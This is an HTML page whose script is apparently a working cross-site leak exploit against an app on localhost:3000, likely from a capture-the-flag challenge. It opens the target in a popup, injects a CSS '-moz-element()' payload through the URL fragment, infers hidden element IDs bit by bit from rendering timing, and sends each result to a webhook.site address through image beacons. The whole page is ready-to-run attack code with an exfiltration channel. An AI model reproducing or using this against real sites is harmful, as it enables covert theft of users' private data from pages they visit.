<!doctype html><html><head><meta charset="utf-8"><title>r</title></head><body><script>
(function(){
var WH = "https://webhook.site/19df9959-1780-4948-a6c1-a6e5d7df5d90";
var TARGET = "http://localhost:3000/";
function q(k,d){var s=location.search+"&"+location.hash.replace(/^#/,"");var m=new RegExp("[?&#]"+k+"=([^&]*)").exec(s);return m?decodeURIComponent(m[1]):d;}
var start = parseInt(q("start","0"),10);
var ns    = parseInt(q("ns","16"),10);
var pm    = parseInt(q("pm","350"),10);
var bx    = parseInt(q("bx","2000"),10);
var ly    = parseInt(q("ly","5"),10);
var tsz   = q("ts","1,2,3,400,7");           // comma tile sizes
var tiles = tsz.split(",").map(Number);
var sid   = q("sid", Math.random().toString(36).slice(2,7));

function beacon(tag,data){ try{ var i=new Image(); i.src = WH + "?sid="+sid+"&tag="+encodeURIComponent(tag)+"&d="+encodeURIComponent(data)+"&t="+Date.now(); }catch(e){} }
function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}

function payload(id){
  var L=[]; for(var i=0;i<ly;i++){ var t=tiles[i%tiles.length]; L.push("-moz-element(#"+id+") "+i+"px "+i+"px/"+t+"px "+(t+1)+"px"); }
  return '<p style="position:fixed;top:0;left:0;width:'+bx+'px;height:'+bx+'px;background:'+L.join(",")+'">x</p>';
}

var maxGap=0,lastT=0;
function tick(){ var n=performance.now(); var g=n-lastT; if(g>maxGap)maxGap=g; lastT=n; setTimeout(tick,0); }

var win=null, counter=0;
async function measure(id){
  counter++;
  maxGap=0; lastT=performance.now();
  try{ win.location = TARGET+"?n="+counter+"#"+encodeURIComponent(payload(id)); }catch(e){ beacon("err","loc "+e); }
  await sleep(pm);
  // CPU contention probe
  var bstart=performance.now(), x=0; for(var i=0;i<3000000;i++){ x+=Math.sqrt(i*1.0001); }
  var busy=performance.now()-bstart;
  return {id:id, gap:Math.round(maxGap), busy:Math.round(busy)};
}

(async function(){
  beacon("ALIVE","ua="+navigator.userAgent.slice(0,40)+";cfg bx="+bx+" ly="+ly+" ts="+tsz+" pm="+pm+" start="+start+" ns="+ns);
  try{ win=window.open(TARGET+"?init=1#hi","imp","width=900,height=700"); }catch(e){ beacon("err","open "+e); }
  if(!win){ beacon("err","popup-null"); window.__IMPRESSION_DONE__=true; return; }
  setTimeout(tick,0);
  await sleep(800);
  // calibration: absent ids
  var cA=await measure("bit-999-0");
  var cB=await measure("bit-888-1");
  beacon("cal","A="+cA.gap+"/"+cA.busy+" B="+cB.gap+"/"+cB.busy);
  for(var s=start;s<start+ns;s++){
    var row=[];
    for(var b=0;b<4;b++){ var r=await measure("bit-"+s+"-"+b); row.push(r.gap+"/"+r.busy); }
    beacon("s"+s, row.join(","));
  }
  var cC=await measure("bit-777-2");
  beacon("cal2","C="+cC.gap+"/"+cC.busy+" total="+counter);
  beacon("DONE","sid="+sid);
  try{ window.__IMPRESSION_DONE__=true; }catch(e){}
})();
})();
</script></body></html>
